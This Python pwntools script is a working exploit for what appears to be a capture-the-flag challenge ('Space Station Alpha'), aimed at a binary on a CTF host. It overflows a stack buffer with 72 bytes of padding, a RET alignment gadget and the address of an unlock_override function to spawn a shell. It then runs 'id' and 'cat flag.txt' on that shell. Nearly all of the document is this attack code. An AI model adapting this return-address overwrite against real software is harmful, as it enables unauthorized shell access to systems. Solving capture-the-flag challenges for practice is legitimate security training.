#!/usr/bin/env python3
"""
Space Station Alpha - Working Remote Exploit
Uses proper timing and shell handling
"""
from pwn import *

# Configuration
REMOTE_HOST = "ctf.neocyberrange.com"
REMOTE_PORT = 9003
LOCAL_BINARY = "./spaceterm"

# Addresses from the binary
UNLOCK_OVERRIDE = 0x401176
RET_GADGET = 0x401016

def exploit(is_remote=True):
    if is_remote:
        log.info(f"Connecting to {REMOTE_HOST}:{REMOTE_PORT}")
        p = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        log.info("Running locally")
        p = process(LOCAL_BINARY)
    
    # Wait for prompt
    p.recvuntil(b'ACCESS CODE > ')
    log.info("Got prompt")
    
    # Build payload: 72 bytes padding + RET gadget (for alignment) + unlock_override address
    payload = b'A' * 72
    payload += p64(RET_GADGET)      # Stack alignment
    payload += p64(UNLOCK_OVERRIDE)  # Return to unlock_override
    
    log.info(f"Sending payload ({len(payload)} bytes)")
    p.sendline(payload)
    
    # Small delay to let the shell spawn
    sleep(0.5)
    
    # The program will print "ACCESS DENIED" before returning
    # But after returning, it should jump to unlock_override and spawn a shell
    
    # Try to interact with the shell
    log.success("Payload sent! Attempting to interact with shell...")
    
    # Send a command to test if we have a shell
    p.sendline(b"id")
    sleep(0.3)
    p.sendline(b"cat flag.txt")
    sleep(0.3)
    
    # Get the response
    try:
        response = p.recvall(timeout=3)
        print("\n" + "="*60)
        print("RESPONSE:")
        print("="*60)
        print(response.decode('latin-1', errors='ignore'))
        
        if b'GTH{' in response:
            log.success("FLAG FOUND!")
        elif b'OVERRIDE' in response or b'uid=' in response:
            log.success("Shell spawned! Flag should be visible above.")
        else:
            log.warning("Shell may not have spawned properly")
    except:
        log.info("Switching to interactive mode...")
        p.interactive()

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == "local":
        exploit(is_remote=False)
    else:
        exploit(is_remote=True)
